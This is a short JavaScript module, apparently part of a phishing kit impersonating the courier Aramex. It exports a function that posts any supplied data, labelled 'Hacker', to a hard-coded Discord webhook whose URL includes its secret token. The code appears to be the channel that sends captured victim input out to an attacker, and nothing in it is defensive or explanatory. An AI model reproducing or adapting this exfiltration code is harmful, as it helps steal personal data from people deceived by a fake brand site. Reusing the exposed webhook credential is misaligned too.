import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1339665102080573440/gA7AFx1rtJ8szVzGwsMndGtKnPQq7AsNFaNsOLRX23-bVX38Gref5zeL9pYNc-w7D4Vj",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
